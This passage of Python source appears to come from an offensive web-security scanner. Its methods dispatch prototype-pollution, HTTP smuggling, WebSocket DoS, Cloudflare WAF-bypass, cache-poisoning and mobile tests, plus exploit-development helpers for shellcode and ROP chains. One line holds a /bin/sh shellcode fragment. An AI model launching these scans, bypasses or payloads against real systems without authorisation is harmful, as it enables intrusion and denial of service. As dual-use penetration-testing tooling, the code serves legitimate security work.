            result = run_pp_scan(url, scan_type='client')
        self.results['findings']['client_pp'] = result
        js_files = result.get('details', {}).get('js_files_analyzed', 0)
        patterns = len(result.get('details', {}).get('vulnerable_patterns', []))
        console.print(f"  [green]JS files analyzed: {js_files}, Vulnerable patterns: {patterns}[/green]")

    def _scan_dom_clobber(self):
        """345: DOM Clobbering Detection"""
        console.print(f"\n[bold red][*] DOM CLOBBERING DETECTION on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Detecting DOM clobbering...[/bold cyan]"):
            result = run_pp_scan(url, scan_type='dom_clobber')
        self.results['findings']['dom_clobber'] = result
        globals_count = len(result.get('details', {}).get('clobberable_globals', []))
        console.print(f"  [green]Clobberable globals: {globals_count}[/green]")

    def _scan_pp_full(self):
        """346: Prototype Pollution Full Scan"""
        console.print(f"\n[bold red][*] PROTOTYPE POLLUTION FULL SCAN on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Running full prototype pollution scan...[/bold cyan]"):
            result = run_pp_scan(url, scan_type='full')
        self.results['findings']['pp_full'] = result
        findings_count = len(result.get('findings', []))
        console.print(f"  [green]Total PP findings: {findings_count}[/green]")

    def _scan_ws_dos(self):
        """347: WebSocket DoS Test"""
        console.print(f"\n[bold red][*] WEBSOCKET DOS TEST on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Testing WebSocket DoS vectors...[/bold cyan]"):
            result = run_ws_scan(url, scan_type='dos')
        self.results['findings']['ws_dos'] = result
        tests = len(result.get('details', {}).get('tests_run', []))
        console.print(f"  [green]DoS tests run: {tests}[/green]")

    def _scan_h2cl_detection(self):
        """348: H2.CL Detection"""
        console.print(f"\n[bold red][*] H2.CL SMUGGLING DETECTION on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Detecting H2.CL smuggling...[/bold cyan]"):
            result = run_h2c_scan(url, scan_type='h2cl')
        self.results['findings']['h2cl_detection'] = result
        console.print(f"  [green]H2.CL suspected: {result.get('vulnerable', False)}[/green]")

    def _scan_smuggling_timing(self):
        """349: HTTP Smuggling Timing Analysis"""
        console.print(f"\n[bold red][*] HTTP SMUGGLING TIMING ANALYSIS on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Running timing-based smuggling analysis...[/bold cyan]"):
            result = run_h2c_scan(url, scan_type='timing')
        self.results['findings']['smuggling_timing'] = result
        baseline = result.get('details', {}).get('baseline_ms', 0)
        console.print(f"  [green]Baseline: {baseline:.1f}ms[/green]")

    def _scan_pp_gadget_chains(self):
        """350: PP Gadget Chain Finder"""
        console.print(f"\n[bold red][*] PP GADGET CHAIN FINDER on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Identifying prototype pollution gadget chains...[/bold cyan]"):
            result = run_pp_scan(url, scan_type='gadgets')
        self.results['findings']['pp_gadget_chains'] = result
        gadgets = len(result.get('details', {}).get('applicable_gadgets', []))
        console.print(f"  [green]Applicable gadget chains: {gadgets}[/green]")

    def _scan_ws_message_replay(self):
        """351: WebSocket Message Replay"""
        console.print(f"\n[bold red][*] WEBSOCKET MESSAGE REPLAY on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Testing WebSocket message replay...[/bold cyan]"):
            result = run_ws_scan(url, scan_type='replay')
        self.results['findings']['ws_message_replay'] = result
        replayed = result.get('details', {}).get('messages_replayed', 0)
        console.print(f"  [green]Messages replayed: {replayed}[/green]")

    def _scan_pp_json_body(self):
        """352: PP via JSON Body"""
        console.print(f"\n[bold red][*] PP VIA JSON BODY on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Testing prototype pollution via JSON body...[/bold cyan]"):
            result = run_pp_scan(url, scan_type='json_body')
        self.results['findings']['pp_json_body'] = result
        payloads = result.get('details', {}).get('payloads_tested', 0)
        console.print(f"  [green]JSON PP payloads tested: {payloads}[/green]")

    def _scan_ws_h2c_pp_combined(self):
        """353: WS + H2C + PP Combined Scan"""
        console.print(f"\n[bold red][*] WS + H2C + PP COMBINED SCAN on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        all_results = {}

        # Phase 1: WebSocket Full Scan
        console.print(f"\n[bold cyan]=== Phase 1: WebSocket Security ===[/bold cyan]")
        with console.status("[bold cyan]Running WebSocket security scan...[/bold cyan]"):
            all_results['websocket'] = run_ws_scan(url, scan_type='full')

        # Phase 2: HTTP Smuggling Full Scan
        console.print(f"\n[bold yellow]=== Phase 2: HTTP/2 Smuggling ===[/bold yellow]")
        with console.status("[bold yellow]Running HTTP smuggling scan...[/bold cyan]"):
            all_results['h2c_smuggling'] = run_h2c_scan(url, scan_type='full')

        # Phase 3: Prototype Pollution Full Scan
        console.print(f"\n[bold magenta]=== Phase 3: Prototype Pollution ===[/bold magenta]")
        with console.status("[bold magenta]Running prototype pollution scan...[/bold cyan]"):
            all_results['prototype_pollution'] = run_pp_scan(url, scan_type='full')

        self.results['findings']['ws_h2c_pp_combined'] = all_results
        ws_findings = len(all_results.get('websocket', {}).get('findings', []))
        h2c_findings = len(all_results.get('h2c_smuggling', {}).get('findings', []))
        pp_findings = len(all_results.get('prototype_pollution', {}).get('findings', []))
        total = ws_findings + h2c_findings + pp_findings
        console.print(f"\n[bold green][+] Combined scan complete: WS({ws_findings}) + H2C({h2c_findings}) + PP({pp_findings}) = {total} total findings[/bold green]")

    # ========================================================================
    # Scan IDs 354-373: Payload DB + Exploit Dev + Metadata Engines (Task 8a)
    # ========================================================================

    def _scan_payload_db_browse(self):
        """354: Payload DB Browse"""
        console.print(f"\n[bold red][*] PAYLOAD DB BROWSE on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Browsing payload database...[/bold cyan]"):
            result = run_payload_db(target=url, scan_type='browse')
        self.results['findings']['payload_db_browse'] = result
        count = result.get('details', {}).get('payload_count', 0)
        console.print(f"  [green]Payloads found: {count}[/green]")

    def _scan_payload_search(self):
        """355: Payload Search"""
        console.print(f"\n[bold red][*] PAYLOAD SEARCH on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Searching payloads...[/bold cyan]"):
            result = run_payload_db(target=url, scan_type='search', query=self.target)
        self.results['findings']['payload_search'] = result
        matches = result.get('details', {}).get('total_matches', 0)
        console.print(f"  [green]Matches: {matches}[/green]")

    def _scan_gf_categorize(self):
        """356: GF-Style URL Categorize"""
        console.print(f"\n[bold red][*] GF-STYLE URL CATEGORIZE on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Categorizing URLs (GF-style)...[/bold cyan]"):
            result = run_payload_db(target=url, scan_type='categorize', urls=[url])
        self.results['findings']['gf_categorize'] = result
        categories = result.get('details', {}).get('categories', {})
        console.print(f"  [green]Categories matched: {len(categories)}[/green]")

    def _scan_waf_bypass_payloads(self):
        """357: WAF Bypass Payloads"""
        console.print(f"\n[bold red][*] WAF BYPASS PAYLOADS on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Getting WAF bypass payloads...[/bold cyan]"):
            result = run_payload_db(target=url, scan_type='waf_bypass', waf_type='cloudflare')
        self.results['findings']['waf_bypass_payloads'] = result
        total = result.get('details', {}).get('total_payloads', 0)
        console.print(f"  [green]WAF bypass payloads: {total}[/green]")

    def _scan_payload_full_db(self):
        """358: Payload Full DB"""
        console.print(f"\n[bold red][*] PAYLOAD FULL DB DUMP on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Dumping full payload database...[/bold cyan]"):
            result = run_payload_db(target=url, scan_type='full_db')
        self.results['findings']['payload_full_db'] = result
        total = result.get('details', {}).get('total_payloads', 0)
        categories = result.get('details', {}).get('total_categories', 0)
        console.print(f"  [green]Total: {total} payloads across {categories} categories[/green]")

    def _scan_pattern_generation(self):
        """359: Pattern Generation (PwnTools)"""
        console.print(f"\n[bold red][*] CYCLIC PATTERN GENERATION on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Generating cyclic pattern...[/bold cyan]"):
            result = run_exploit_dev(target=url, scan_type='pattern', length=10000)
        self.results['findings']['pattern_generation'] = result
        preview = result.get('details', {}).get('pattern', '')[:40]
        console.print(f"  [green]Pattern preview: {preview}...[/green]")

    def _scan_rop_chain_helper(self):
        """360: ROP Chain Helper"""
        console.print(f"\n[bold red][*] ROP CHAIN HELPER on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Generating ROP chain templates...[/bold cyan]"):
            result = run_exploit_dev(target=url, scan_type='rop_chain', binary_info={'arch': 'x86', 'os': 'linux'})
        self.results['findings']['rop_chain_helper'] = result
        chains = len(result.get('details', {}).get('rop_chains', []))
        console.print(f"  [green]ROP chain templates: {chains}[/green]")

    def _scan_shellcode_generation(self):
        """361: Shellcode Generation"""
        console.print(f"\n[bold red][*] SHELLCODE GENERATION on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Generating shellcode...[/bold cyan]"):
            result = run_exploit_dev(target=url, scan_type='shellcode', arch='x86', os='linux')
        self.results['findings']['shellcode_generation'] = result
        count = len(result.get('details', {}).get('shellcodes', {}))
        console.print(f"  [green]Shellcodes generated: {count}[/green]")

    def _scan_format_string_test(self):
        """362: Format String Test"""
        console.print(f"\n[bold red][*] FORMAT STRING TEST on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Testing format string vulnerabilities...[/bold cyan]"):
            result = run_exploit_dev(target=url, scan_type='format_string')
        self.results['findings']['format_string_test'] = result
        tested = result.get('details', {}).get('payloads_tested', 0)
        vulnerable = result.get('vulnerable', False)
        console.print(f"  [{'red' if vulnerable else 'green'}]Payloads tested: {tested} | Vulnerable: {vulnerable}[/{'red' if vulnerable else 'green'}]")

    def _scan_integer_overflow_test(self):
        """363: Integer Overflow Test"""
        console.print(f"\n[bold red][*] INTEGER OVERFLOW TEST on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Testing integer overflow...[/bold cyan]"):
            result = run_exploit_dev(target=url, scan_type='integer_overflow')
        self.results['findings']['integer_overflow_test'] = result
        tested = result.get('details', {}).get('payloads_tested', 0)
        vulnerable = result.get('vulnerable', False)
        console.print(f"  [{'red' if vulnerable else 'green'}]Payloads tested: {tested} | Vulnerable: {vulnerable}[/{'red' if vulnerable else 'green'}]")

    def _scan_exploit_dev_tools(self):
        """364: Exploit Dev Tools"""
        console.print(f"\n[bold red][*] EXPLOIT DEV TOOLS on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        all_results = {}

        # Phase 1: Pattern Generation
        console.print(f"\n[bold cyan]=== Phase 1: Pattern Generation ===[/bold cyan]")
        with console.status("[bold cyan]Generating cyclic patterns...[/bold cyan]"):
            all_results['pattern'] = run_exploit_dev(target=url, scan_type='pattern', length=10000)

        # Phase 2: Shellcode
        console.print(f"\n[bold yellow]=== Phase 2: Shellcode Generation ===[/bold yellow]")
        with console.status("[bold yellow]Generating shellcode...[/bold yellow]"):
            all_results['shellcode'] = run_exploit_dev(target=url, scan_type='shellcode', arch='x86', os='linux')

        # Phase 3: ROP Chain
        console.print(f"\n[bold magenta]=== Phase 3: ROP Chain Helper ===[/bold magenta]")
        with console.status("[bold magenta]Building ROP chain templates...[/bold magenta]"):
            all_results['rop_chain'] = run_exploit_dev(target=url, scan_type='rop_chain', binary_info={'arch': 'x86', 'os': 'linux'})

        # Phase 4: Format String Test
        console.print(f"\n[bold red]=== Phase 4: Format String Test ===[/bold red]")
        with console.status("[bold red]Testing format string...[/bold red]"):
            all_results['format_string'] = run_exploit_dev(target=url, scan_type='format_string')

        # Phase 5: Integer Overflow Test
        console.print(f"\n[bold blue]=== Phase 5: Integer Overflow Test ===[/bold blue]")
        with console.status("[bold blue]Testing integer overflow...[/bold blue]"):
            all_results['integer_overflow'] = run_exploit_dev(target=url, scan_type='integer_overflow')

        self.results['findings']['exploit_dev_tools'] = all_results
        total = sum(len(r.get('findings', [])) for r in all_results.values())
        console.print(f"\n[bold green][+] Exploit Dev Tools complete: {total} total findings[/bold green]")

    def _scan_image_exif_extraction(self):
        """365: Image EXIF Extraction"""
        console.print(f"\n[bold red][*] IMAGE EXIF EXTRACTION on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Extracting image EXIF data...[/bold cyan]"):
            result = run_metadata(target=url, scan_type='image_exif')
        self.results['findings']['image_exif_extraction'] = result
        fields = len(result.get('details', {}).get('exif_data', {}))
        has_gps = result.get('details', {}).get('has_gps', False)
        console.print(f"  [green]EXIF fields: {fields} | GPS data: {has_gps}[/green]")

    def _scan_doc_metadata_extract(self):
        """366: Document Metadata Extract"""
        console.print(f"\n[bold red][*] DOCUMENT METADATA EXTRACT on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Extracting document metadata...[/bold cyan]"):
            result = run_metadata(target=url, scan_type='doc_metadata')
        self.results['findings']['doc_metadata_extract'] = result
        fields = len(result.get('details', {}).get('metadata', {}))
        authors = len(result.get('details', {}).get('authors', []))
        console.print(f"  [green]Metadata fields: {fields} | Authors: {authors}[/green]")

    def _scan_metadata_strip(self):
        """367: Metadata Strip/Anonymize"""
        console.print(f"\n[bold red][*] METADATA STRIP/ANONYMIZE on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Stripping metadata...[/bold cyan]"):
            result = run_metadata(target=url, scan_type='strip')
        self.results['findings']['metadata_strip'] = result
        stripped = result.get('details', {}).get('stripped', False)
        fields_removed = len(result.get('details', {}).get('fields_removed', []))
        console.print(f"  [green]Stripped: {stripped} | Fields removed: {fields_removed}[/green]")

    def _scan_opsec_check(self):
        """368: OPSEC Check"""
        console.print(f"\n[bold red][*] OPSEC CHECK on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Running OPSEC check...[/bold cyan]"):
            result = run_metadata(scan_type='opsec')
        self.results['findings']['opsec_check'] = result
        status = result.get('details', {}).get('overall_status', 'UNKNOWN')
        passed = result.get('details', {}).get('checks_passed', 0)
        failed = result.get('details', {}).get('checks_failed', 0)
        console.print(f"  [green]Status: {status} | Passed: {passed} | Failed: {failed}[/green]")

    def _scan_privacy_risk_assessment(self):
        """369: Privacy Risk Assessment"""
        console.print(f"\n[bold red][*] PRIVACY RISK ASSESSMENT on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        # First extract metadata, then assess
        with console.status("[bold cyan]Extracting metadata for privacy assessment...[/bold cyan]"):
            exif_result = run_metadata(target=url, scan_type='image_exif')
            doc_result = run_metadata(target=url, scan_type='doc_metadata')
        combined_metadata = {}
        combined_metadata.update(exif_result.get('details', {}).get('exif_data', {}))
        combined_metadata.update(doc_result.get('details', {}).get('metadata', {}))
        with console.status("[bold cyan]Assessing privacy risk...[/bold cyan]"):
            result = run_metadata(scan_type='privacy_risk', metadata=combined_metadata)
        self.results['findings']['privacy_risk_assessment'] = result
        score = result.get('details', {}).get('risk_score', 0)
        level = result.get('details', {}).get('risk_level', 'UNKNOWN')
        console.print(f"  [green]Risk score: {score} | Level: {level}[/green]")

    def _scan_metadata_full_scan(self):
        """370: Metadata Full Scan"""
        console.print(f"\n[bold red][*] METADATA FULL SCAN on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Running full metadata scan...[/bold cyan]"):
            result = run_metadata(target=url, scan_type='full_scan')
        self.results['findings']['metadata_full_scan'] = result
        phases = len(result.get('details', {}))
        vulnerable = result.get('vulnerable', False)
        console.print(f"  [green]Phases: {phases} | Vulnerable: {vulnerable}[/green]")

    def _scan_payload_import_custom(self):
        """371: Payload Import Custom"""
        console.print(f"\n[bold red][*] PAYLOAD IMPORT CUSTOM on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Importing custom payloads...[/bold cyan]"):
            result = run_payload_db(target=url, scan_type='import', category='custom')
        self.results['findings']['payload_import_custom'] = result
        imported = result.get('details', {}).get('imported', 0)
        console.print(f"  [green]Imported: {imported} payloads[/green]")

    def _scan_payload_encode_bad_chars(self):
        """372: Payload Encode (Bad Chars)"""
        console.print(f"\n[bold red][*] PAYLOAD ENCODE (BAD CHARS) on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Encoding payload for bad characters...[/bold cyan]"):
            result = run_exploit_dev(target=url, scan_type='encode', payload='\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68', bad_chars='null_newline_cr')
        self.results['findings']['payload_encode_bad_chars'] = result
        methods = len(result.get('details', {}).get('encoding_methods', []))
        console.print(f"  [green]Encoding methods: {methods}[/green]")

    def _scan_payload_exploit_metadata_combined(self):
        """373: PayloadDB + Exploit + Metadata Combined"""
        console.print(f"\n[bold red][*] PAYLOADDB + EXPLOIT + METADATA COMBINED on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        all_results = {}

        # Phase 1: Payload DB Full
        console.print(f"\n[bold cyan]=== Phase 1: Payload Database ===[/bold cyan]")
        with console.status("[bold cyan]Running payload database scan...[/bold cyan]"):
            all_results['payload_db'] = run_payload_db(target=url, scan_type='full_db')

        # Phase 2: Exploit Dev Tools
        console.print(f"\n[bold yellow]=== Phase 2: Exploit Dev ===[/bold yellow]")
        with console.status("[bold yellow]Running exploit dev tools...[/bold yellow]"):
            all_results['exploit_dev'] = run_exploit_dev(target=url, scan_type='tools')

        # Phase 3: Metadata Full Scan
        console.print(f"\n[bold magenta]=== Phase 3: Metadata + OPSEC ===[/bold magenta]")
        with console.status("[bold magenta]Running metadata scan...[/bold magenta]"):
            all_results['metadata'] = run_metadata(target=url, scan_type='full_scan')

        self.results['findings']['payload_exploit_metadata_combined'] = all_results
        db_payloads = all_results.get('payload_db', {}).get('details', {}).get('total_payloads', 0)
        meta_vuln = all_results.get('metadata', {}).get('vulnerable', False)
        console.print(f"\n[bold green][+] Combined: {db_payloads} payloads | Metadata vulnerable: {meta_vuln}[/bold green]")

    # ========================================================================
    # v5.0 Batch 12 - Bounty Management + Cache Poison Advanced + Mobile Security
    # ========================================================================

    def _scan_bounty_program_mgmt(self):
        """374: Bug Bounty Program Management"""
        console.print(f"\n[bold red][*] BUG BOUNTY PROGRAM MANAGEMENT on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Managing bug bounty programs...[/bold cyan]"):
            result = run_bounty_mgmt(target=url, scan_type='manage')
        self.results['findings']['bounty_program_mgmt'] = result
        programs = result.get('details', {}).get('total_programs', 0)
        console.print(f"  [green]Programs: {programs}[/green]")

    def _scan_finding_classification(self):
        """375: Finding Classification"""
        console.print(f"\n[bold red][*] FINDING CLASSIFICATION on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Classifying findings...[/bold cyan]"):
            result = run_bounty_mgmt(target=url, scan_type='classify', finding={'type': 'auto', 'target': self.target})
        self.results['findings']['finding_classification'] = result
        severity = result.get('details', {}).get('severity', 'Unknown')
        console.print(f"  [green]Severity: {severity}[/green]")

    def _scan_report_generation(self):
        """376: Report Generation"""
        console.print(f"\n[bold red][*] REPORT GENERATION for {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Generating bug bounty report...[/bold cyan]"):
            result = run_bounty_mgmt(target=url, scan_type='report', format='md')
        self.results['findings']['report_generation'] = result
        report_path = result.get('details', {}).get('report_path', '')
        if report_path:
            console.print(f"  [green]Report saved: {report_path}[/green]")
        else:
            console.print(f"  [yellow]No report generated (add program first)[/yellow]")

    def _scan_scope_validation(self):
        """377: Scope Validation"""
        console.print(f"\n[bold red][*] SCOPE VALIDATION for {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Validating target scope...[/bold cyan]"):
            result = run_bounty_mgmt(target=self.target, scan_type='validate', program=self.target)
        self.results['findings']['scope_validation'] = result
        in_scope = result.get('details', {}).get('in_scope', False)
        scope_status = "[green]IN SCOPE[/green]" if in_scope else "[yellow]OUT OF SCOPE[/yellow]"
        console.print(f"  {scope_status}")

    def _scan_bounty_full(self):
        """378: Bounty Management Full Scan"""
        console.print(f"\n[bold red][*] BOUNTY MANAGEMENT FULL SCAN on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Running full bounty management scan...[/bold cyan]"):
            result = run_bounty_mgmt(target=self.target, scan_type='full')
        self.results['findings']['bounty_full'] = result
        details = result.get('details', {})
        total_findings = details.get('findings_summary', {}).get('details', {}).get('total_findings', 0)
        console.print(f"  [green]Total findings across programs: {total_findings}[/green]")

    def _scan_cache_detection(self):
        """379: Cache Detection"""
        console.print(f"\n[bold red][*] CACHE DETECTION on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Detecting caching mechanism...[/bold cyan]"):
            result = run_cache_poison_adv(url, scan_type='detect')
        self.results['findings']['cache_detection'] = result
        cache_type = result.get('details', {}).get('cache_type', 'Not detected')
        detected = result.get('details', {}).get('cache_detected', False)
        console.print(f"  [green]Cache: {cache_type} (detected: {detected})[/green]")

    def _scan_cache_unkeyed(self):
        """380: Cache Unkeyed Input Detection"""
        console.print(f"\n[bold red][*] CACHE UNKEYED INPUT DETECTION on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Detecting unkeyed inputs...[/bold cyan]"):
            result = run_cache_poison_adv(url, scan_type='unkeyed')
        self.results['findings']['cache_unkeyed'] = result
        unkeyed = len(result.get('details', {}).get('unkeyed_headers', []))
        unkeyed_params = len(result.get('details', {}).get('unkeyed_params', []))
        console.print(f"  [green]Unkeyed headers: {unkeyed}, params: {unkeyed_params}[/green]")

    def _scan_cache_header_poison(self):
        """381: Cache Header Poisoning"""
        console.print(f"\n[bold red][*] CACHE HEADER POISONING on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Testing cache header poisoning...[/bold cyan]"):
            result = run_cache_poison_adv(url, scan_type='header')
        self.results['findings']['cache_header_poison'] = result
        poisonable = len(result.get('details', {}).get('poisonable_headers', []))
        console.print(f"  [green]Poisonable headers: {poisonable}[/green]")

    def _scan_cache_deception(self):
        """382: Cache Deception Test"""
        console.print(f"\n[bold red][*] CACHE DECEPTION TEST on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Testing web cache deception...[/bold cyan]"):
            result = run_cache_poison_adv(url, scan_type='deception')
        self.results['findings']['cache_deception'] = result
        cached_paths = len(result.get('details', {}).get('cached_paths', []))
        sensitive = result.get('details', {}).get('sensitive_data_leaked', False)
        console.print(f"  [green]Cached paths: {cached_paths}, sensitive leak: {sensitive}[/green]")

    def _scan_cache_poison_full(self):
        """383: Cache Poisoning Full Scan"""
        console.print(f"\n[bold red][*] CACHE POISONING FULL SCAN on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Running full cache poisoning scan...[/bold cyan]"):
            result = run_cache_poison_adv(url, scan_type='full')
        self.results['findings']['cache_poison_full'] = result
        vuln = result.get('vulnerable', False)
        status = "VULNERABLE" if vuln else "SAFE"
        console.print(f"  [{'red' if vuln else 'green'}]{status}[/{'red' if vuln else 'green'}]")

    def _scan_mobile_api(self):
        """384: Mobile API Security Test"""
        console.print(f"\n[bold red][*] MOBILE API SECURITY TEST on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Testing mobile API security...[/bold cyan]"):
            result = run_mobile_security(url, scan_type='api')
        self.results['findings']['mobile_api'] = result
        endpoints = len(result.get('details', {}).get('endpoints_discovered', []))
        console.print(f"  [green]API endpoints discovered: {endpoints}[/green]")

    def _scan_ssl_pinning(self):
        """385: SSL Pinning Detection"""
        console.print(f"\n[bold red][*] SSL PINNING DETECTION on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Detecting SSL pinning...[/bold cyan]"):
            result = run_mobile_security(url, scan_type='ssl_pinning')
        self.results['findings']['ssl_pinning'] = result
        pinning = result.get('details', {}).get('ssl_pinning_detected', False)
        hsts = result.get('details', {}).get('hsts_enabled', False)
        console.print(f"  [green]SSL pinning: {pinning}, HSTS: {hsts}[/green]")

    def _scan_deep_links(self):
        """386: Deep Link Testing"""
        console.print(f"\n[bold red][*] DEEP LINK TESTING for {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Testing deep links...[/bold cyan]"):
            result = run_mobile_security(self.target, scan_type='deep_links')
        self.results['findings']['deep_links'] = result
        links = len(result.get('details', {}).get('deep_links_found', []))
        console.print(f"  [green]Deep links found: {links}[/green]")

    def _scan_webview_vulns(self):
        """387: WebView Vulnerability Detection"""
        console.print(f"\n[bold red][*] WEBVIEW VULNERABILITY DETECTION on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Detecting WebView vulnerabilities...[/bold cyan]"):
            result = run_mobile_security(url, scan_type='webview')
        self.results['findings']['webview_vulns'] = result
        js_interfaces = len(result.get('details', {}).get('js_interfaces', []))
        injection_points = len(result.get('details', {}).get('script_injection_points', []))
        console.print(f"  [green]JS interfaces: {js_interfaces}, Injection points: {injection_points}[/green]")

    def _scan_mobile_full(self):
        """388: Mobile Security Full Scan"""
        console.print(f"\n[bold red][*] MOBILE SECURITY FULL SCAN on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Running full mobile security scan...[/bold cyan]"):
            result = run_mobile_security(url, scan_type='full')
        self.results['findings']['mobile_full'] = result
        vuln = result.get('vulnerable', False)
        status = "VULNERABLE" if vuln else "SAFE"
        console.print(f"  [{'red' if vuln else 'green'}]{status}[/{'red' if vuln else 'green'}]")

    def _scan_cache_param_cloaking(self):
        """389: Cache Param Cloaking"""
        console.print(f"\n[bold red][*] CACHE PARAM CLOAKING on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Testing cache parameter cloaking...[/bold cyan]"):
            result = run_cache_poison_adv(url, scan_type='cloaking')
        self.results['findings']['cache_param_cloaking'] = result
        techniques = len(result.get('details', {}).get('cloaking_techniques', []))
        console.print(f"  [green]Cloaking techniques found: {techniques}[/green]")

    def _scan_cache_fat_get(self):
        """390: Cache Fat GET Poisoning"""
        console.print(f"\n[bold red][*] CACHE FAT GET POISONING on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Testing Fat GET cache poisoning...[/bold cyan]"):
            result = run_cache_poison_adv(url, scan_type='fat_get')
        self.results['findings']['cache_fat_get'] = result
        body_accepted = result.get('details', {}).get('body_accepted', False)
        body_cached = result.get('details', {}).get('body_cached', False)
        console.print(f"  [green]Body accepted: {body_accepted}, cached: {body_cached}[/green]")

    def _scan_cert_pinning(self):
        """391: Certificate Pinning Test"""
        console.print(f"\n[bold red][*] CERTIFICATE PINNING TEST on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Testing certificate pinning...[/bold cyan]"):
            result = run_mobile_security(url, scan_type='cert_pinning')
        self.results['findings']['cert_pinning'] = result
        hsts = result.get('details', {}).get('hsts_enabled', False)
        ct = result.get('details', {}).get('ct_required', False)
        console.print(f"  [green]HSTS: {hsts}, CT required: {ct}[/green]")

    def _scan_apk_metadata(self):
        """392: APK Metadata Analysis"""
        console.print(f"\n[bold red][*] APK METADATA ANALYSIS[/bold red]")
        # For APK analysis, the target should be a path
        apk_path = self.target
        if not os.path.exists(apk_path):
            console.print(f"  [yellow]Target is not a file path. Using URL-based mobile analysis.[/yellow]")
            url = f"{self.protocol}{self.target}"
            with console.status("[bold cyan]Running mobile API analysis instead...[/bold cyan]"):
                result = run_mobile_security(url, scan_type='api')
        else:
            with console.status("[bold cyan]Analyzing APK metadata...[/bold cyan]"):
                result = run_mobile_security(apk_path, scan_type='apk')
        self.results['findings']['apk_metadata'] = result
        perms = len(result.get('details', {}).get('permissions', []))
        deep_links = len(result.get('details', {}).get('deep_links', []))
        console.print(f"  [green]Permissions: {perms}, Deep links: {deep_links}[/green]")

    def _scan_bounty_cache_mobile_combined(self):
        """393: Bounty + Cache + Mobile Combined"""
        console.print(f"\n[bold red][*] BOUNTY + CACHE + MOBILE COMBINED SCAN on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        all_results = {}

        # Phase 1: Bounty Management
        console.print(f"\n[bold cyan]=== Phase 1: Bug Bounty Management ===[/bold cyan]")
        with console.status("[bold cyan]Running bounty management scan...[/bold cyan]"):
            all_results['bounty_mgmt'] = run_bounty_mgmt(target=self.target, scan_type='full')

        # Phase 2: Cache Poisoning
        console.print(f"\n[bold yellow]=== Phase 2: Cache Poisoning Advanced ===[/bold yellow]")
        with console.status("[bold yellow]Running cache poisoning scan...[/bold cyan]"):
            all_results['cache_poison'] = run_cache_poison_adv(url, scan_type='full')

        # Phase 3: Mobile Security
        console.print(f"\n[bold magenta]=== Phase 3: Mobile Security ===[/bold magenta]")
        with console.status("[bold magenta]Running mobile security scan...[/bold cyan]"):
            all_results['mobile_security'] = run_mobile_security(url, scan_type='full')

        self.results['findings']['bounty_cache_mobile_combined'] = all_results
        bounty_vuln = all_results.get('bounty_mgmt', {}).get('vulnerable', False)
        cache_vuln = all_results.get('cache_poison', {}).get('vulnerable', False)
